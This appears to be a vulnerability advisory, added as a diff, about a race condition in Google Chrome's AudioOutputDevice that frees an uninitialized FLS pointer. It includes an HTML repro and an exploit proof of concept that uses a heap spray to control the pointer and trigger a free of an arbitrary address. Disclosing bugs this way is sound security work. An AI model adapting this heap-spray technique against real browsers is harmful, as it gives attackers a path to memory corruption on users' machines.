@@ -1,0 +1,97 @@
+1177r - Google Chrome AudioOutputDevice use of uninitialized FLS pointer
+=====================================
+
+Synopsis
+--------
+A thread-safety vulnerability exists in Google Chrome when handling audio that
+can lead to use of an uninitialized pointer. This issue is only visible when
+running Chrome with page heap enabled, as the memory used to store the pointer
+appears to be set to 0x0 after allocation when page heap is not enabled. This
+means the pointer will be 0x00000000 for the normal user, which does not lead
+to futher use. However, when running Chrome with page heap enabled, the memory
+will be set to 0xD0 and the pointer to be read as 0xD0D0D0D0 and used in code
+that allows at least freeing of arbitrary memory pointers.
+
+Known affected software and attack vectors
+------------------------------------------
+  + xxx
+
+    An attacker would need to get a target user to open a specially crafted
+    webpage.
+
+Repro
+-----
+<!doctype html>
+<html><head>
+<script>
+  new AudioContext("notification").decodeAudioData(
+    new ArrayBuffer(1),
+    function(){},
+    function(){}
+  );
+  location.reload();
+</script></head></html>
+
+
+Description
+-----------
+The repro triggers a race condition in the AudioOutputDevice thread, where the
+thread is terminated before a pointer to fiber local storage (FLS) is
+initialized.
+
+When the thread is terminated and the FLS pointer is not NULL, the FLS pointer
+is passed to msvcrt!_freefls, which assumes it points to a structure with some
+more pointers. For a number of pointer in the structure, it calls msvcrt!free
+if they are not NULL.
+
+The FLS pointer is stored in memory that is set to 0xD0 when it is allocated to
+indicate it is uninitialized. On 32-bit Windows, this is a relatively safe way
+to detect use of uninitialized pointers:  no memory can be allocated above
+0xC0000000, so any attempt to use an uninitialized pointer will result in an
+access violation at address 0xD0D0D0D0. However, on 64-bit versions of Windows,
+the entire 32-bit address space can be used to allocate memory.
+
+Exploit
+-------
+An attacker could use a heap spray to allocate memory around address 0xD0D0D0D0
+and have the uninitialized pointer point to whatever data is useful. When the
+msvcrt!_freefls function is called, it will process that attacker supplied data.
+
+<!doctype html>
+<html><head>
+<script>
+  function cStructureHeapSpray(uBaseAddress, uSize) {
+    var uHeapSprayBase = 0x80004000;
+    function fuAddressToIndex(uAddress) {
+      return (uAddress - uHeapSprayBase) / 4;
+    };
+    var oThis = this,
+        uArraySize = fuAddressToIndex(uBaseAddress + uSize),
+        adwHeapSpray = new Uint32Array(uArraySize);
+    oThis.fSetDWord = function (uOffset, uValue) {
+      adwHeapSpray[fuAddressToIndex(uBaseAddress + uOffset)] = uValue;
+    };
+  };
+  try {
+    var uStructureAddress = 0xD0D0D0D0;
+        uStructureSize = 0x1000,
+        oStructureHeapSpray = new cStructureHeapSpray(uStructureAddress, uStructureSize);
+    oStructureHeapSpray.fSetDWord(0x24, 0xDEADBEEF); // D0D0D0F4 => 0xDEADBEEF
+  } catch (e) {
+    // still allocated from previous run.
+  }
+  location.reload();
+  new AudioContext("notification").decodeAudioData(
+    new ArrayBuffer(1),
+    function(){},
+    function(){}
+  );
+</script></head></html>
+
+The above code allocates a Uint32Array that is so large it will only fit in the
+(assumed) unused area above 0x80000000. This causes it to be reliably allocated
+at address 0x80004000. Using this array, a pointer at 0xD0D0D0D0 + 0x24 is set
+to 0xDEADBEEF. When msvcrt!_freefls is called with the unintialized FLS pointer,
+it will check if the pointer at 0x24 is not NULL and call msvcrt!free to free
+the memory it points to. This leads to an attempt to free memory at address
+0xDEADBEEF, which should result in a crash.
